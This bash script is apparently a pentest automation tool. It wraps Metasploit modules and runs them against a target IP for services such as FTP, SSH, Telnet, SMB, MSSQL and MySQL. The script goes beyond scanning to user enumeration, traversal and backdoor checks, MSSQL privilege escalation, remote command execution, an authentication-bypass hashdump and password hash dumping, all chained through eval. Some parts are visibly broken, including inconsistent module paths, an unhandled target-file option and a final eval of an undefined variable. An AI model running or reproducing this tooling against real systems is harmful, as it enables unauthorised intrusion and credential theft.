#!/bin/bash

RESTORE='\033[0m'
BLACK='\033[00;30m'
RED='\033[00;31m'
GREEN='\033[00;32m'
YELLOW='\033[00;33m'
BLUE='\033[00;34m'
PURPLE='\033[00;35m'
CYAN='\033[00;36m'
LIGHTGRAY='\033[00;37m'
LBLACK='\033[01;30m'
LRED='\033[01;31m'
LGREEN='\033[01;32m'
LYELLOW='\033[01;33m'
LBLUE='\033[01;34m'
LPURPLE='\033[01;35m'
LCYAN='\033[01;36m'
WHITE='\033[01;37m'
OVERWRITE='\e[1A\e[K'

# Function to display help
display_help() {
    printf "
${LCYAN}
                                                                         
           _               _     _ _                                     
 _____ ___| |_ ___ ___ ___| |___|_| |_ ___ ___ _____ ___ ___ ___ ___ ___ 
|     | -_|  _| .'|_ -| . | | . | |  _|  _| .'|     | . | .'| . | -_|_ -|
|_|_|_|___|_| |__,|___|  _|_|___|_|_| |_| |__,|_|_|_|  _|__,|_  |___|___|
                      |_|                           |_|     |___|        

Usage: $0 [options]

Options:
    ${LBLUE}-h, --help${RESTORE}                Display this help message
    ${LBLUE}-t, --target <IP|file>${RESTORE}    Specify the target IP address or file containing IPs
    ${LBLUE}-p, --port <port>${RESTORE}         Specify the target port (e.g., 21, 22, 23, etc.)
    ${LBLUE}-a, --all${RESTORE}                 Execute all scans for common ports

Example:
    $0 -t 192.168.1.100 -p 22
    $0 -t targets.txt -a
    $0 -h
${RESTORE}
"
}

# Function to execute Metasploit commands for a specific port
execute_metasploit() {
    local port="$1"
    local target="$2"
    local metasploit_command=""

    case "$port" in
        21)
            metasploit_command="./msfconsole -q -x 'use auxiliary/scanner/ftp/anonymous; set RHOSTS $target; set RPORT 21; run; exit' && msfconsole -q -x 'use auxiliary/scanner/ftp/ftp_version; set RHOSTS $target; set RPORT 21; run; exit' && msfconsole -q -x 'use auxiliary/scanner/ftp/bison_ftp_traversal; set RHOSTS $target; set RPORT 21; run; exit' && msfconsole -q -x 'use auxiliary/scanner/ftp/colorado_ftp_traversal; set RHOSTS $target; set RPORT 21; run; exit' &&  msfconsole -q -x 'use auxiliary/scanner/ftp/titanftp_xcrc_traversal; set RHOSTS $target; set RPORT 21; run; exit'"
            ;;
        22)
            metasploit_command="./msfconsole -q -x 'use auxiliary/scanner/ssh/ssh_version; set RHOSTS $target; set RPORT 22; run; exit' && msfconsole -q -x 'use scanner/ssh/ssh_enumusers; set RHOSTS $target; set RPORT 22; set USER_FILE /opt/metasploit-framework/bin/data/wordlists/root_userpass.txt; run; exit' && msfconsole -q -x 'use auxiliary/scanner/ssh/juniper_backdoor; set RHOSTS $target; set RPORT 22; run; exit'"
            ;;
        23)
            metasploit_command="./msfconsole -q -x 'use auxiliary/scanner/telnet/telnet_version; set RHOSTS $target; set RPORT 23; run; exit' && msfconsole -q -x 'use auxiliary/scanner/telnet/brocade_enable_login; set RHOSTS $target; set RPORT 23; run; exit' && msfconsole -q -x 'use auxiliary/scanner/telnet/telnet_encrypt_overflow; set RHOSTS $target; set RPORT 23; run; exit' && msfconsole -q -x 'use auxiliary/scanner/telnet/telnet_ruggedcom; set RHOSTS $target; set RPORT 23; run; exit'"
            ;;
        25|465|587)
            metasploit_command="./msfconsole -q -x 'use auxiliary/scanner/smtp/smtp_version; set RHOSTS $target; set RPORT $port; run; exit' && msfconsole -q -x 'use auxiliary/scanner/smtp/smtp_ntlm_domain; set RHOSTS $target; set RPORT $port; run; exit' && msfconsole -q -x 'use auxiliary/scanner/smtp/smtp_relay; set RHOSTS $target; set RPORT $port; run; exit'"
            ;;
        53)
            metasploit_command="./msfconsole -q -x 'use auxiliary/scanner/dns/dns_amp; set RHOSTS $target; set RPORT $port; run; exit' && msfconsole -q -x 'use auxiliary/gather/enum_dns; set RHOSTS $target; set RPORT $port; run; exit'"
            ;;
        110|995)
            metasploit_command="./msfconsole -q -x 'use auxiliary/scanner/pop3/pop3_version; set RHOSTS $target; set RPORT $port; run; exit'"
            ;;
        139|445)
            metasploit_command="./msfconsole -q -x 'use auxiliary/scanner/smb/smb_version; set RHOSTS $target; set RPORT $port; run; exit' && msfconsole -q -x 'use auxiliary/scanner/smb/smb2; set RHOSTS $target; set RPORT $port; run; exit'"
            ;;
        143|993)
            metasploit_command="./msfconsole -q -x 'use auxiliary/scanner/imap/imap_version; set RHOSTS $target; set RPORT $port; run; exit'"
            ;;
        1433)
            metasploit_command="./msfconsole -q -x 'use auxiliary/scanner/mssql/mssql_ping; set RHOSTS $target; set RPORT $port; run; exit' && msfconsole -q -x 'use auxiliary/admin/mssql/mssql_enum; set RHOSTS $target; set RPORT $port; run; exit' && msfconsole -q -x 'use admin/mssql/mssql_enum_domain_accounts; set RHOSTS $target; set RPORT $port; run; exit' && msfconsole -q -x 'use admin/mssql/mssql_enum_sql_logins; set RHOSTS $target; set RPORT $port; run; exit' && msfconsole -q -x 'use auxiliary/admin/mssql/mssql_escalate_dbowner; set RHOSTS $target; set RPORT $port; run; exit' && msfconsole -q -x 'use auxiliary/admin/mssql/mssql_escalate_execute_as; set RHOSTS $target; set RPORT $port; run; exit' && msfconsole -q -x 'use auxiliary/admin/mssql/mssql_exec; set RHOSTS $target; set RPORT $port; run; exit' && msfconsole -q -x 'use auxiliary/admin/mssql/mssql_findandsampledata; set RHOSTS $target; set RPORT $port; run; exit' && msfconsole -q -x 'use auxiliary/scanner/mssql/mssql_hashdump; set RHOSTS $target; set RPORT $port; run; exit' && msfconsole -q -x 'use auxiliary/scanner/mssql/mssql_schemadump; set RHOSTS $target; set RPORT $port; run; exit'"
            ;;
        3306)
            metasploit_command="./msfconsole -q -x 'use auxiliary/scanner/mysql/mysql_version; set RHOSTS $target; set RPORT $port; run; exit' && msfconsole -q -x 'use auxiliary/scanner/mysql/mysql_authbypass_hashdump; set RHOSTS $target; set RPORT $port; run; exit' && msfconsole -q -x 'use auxiliary/admin/mysql/mysql_enum; set RHOSTS $target; set RPORT $port; run; exit' && msfconsole -q -x 'use auxiliary/scanner/mysql/mysql_hashdump; set RHOSTS $target; set RPORT $port; run; exit' && msfconsole -q -x 'use auxiliary/scanner/mysql/mysql_schemadump; set RHOSTS $target; set RPORT $port; run; exit'"
            ;;
        *)
            echo "Unsupported port: $port"
            ;;
    esac

    # Execute Metasploit commands
    if [ -n "$metasploit_command" ]; then
        eval "$metasploit_command"
    else
        echo "No Metasploit command to execute."
    fi
}

# Main function
main() {
    local target=""
    local port=""
    local execute_all=false

    while [[ $# -gt 0 ]]; do
        case "$1" in
            -h|--help)
                display_help
                exit 0
                ;;
            -t|--target)
                target="$2"
                shift 2
                ;;
            -p|--port)
                port="$2"
                shift 2
                ;;
            -a|--all)
                execute_all=true
                shift
                ;;
            *)
                echo "Unknown option: $1"
                display_help
                exit 1
                ;;
        esac
    done

    # Check if target is provided
    if [ -z "$target" ]; then
        echo -e "${RED}Error: Please specify a target IP address or file using -t/--target.${RESTORE}"
        display_help
        exit 1
    fi

    # Check if executing all scans
    if [ "$execute_all" = true ]; then
        for common_port in 21 22 23 25 465 587 53 110 995 139 445 143 993 1433 3306; do
            execute_metasploit "$common_port" "$target"
        done
    else
        # Check if a single port is specified
        if [ -n "$port" ]; then
            execute_metasploit "$port" "$target"
        else
            echo -e "${RED}Error: Please specify a target port using -p/--port or use -a/--all to execute all common scans.${RESTORE}"
            display_help
            exit 1
        fi
    fi

    # Execute the Nmap command
    echo ""
    echo -e "${LCYAN}Created by MarmutHandsome"
    echo "Version 1.0"
    echo ""
    echo "Starting!!!${RESTORE}"
    # echo "Running the following Nmap command:"
    # echo "$command"
    eval "$command"
}

main "$@"
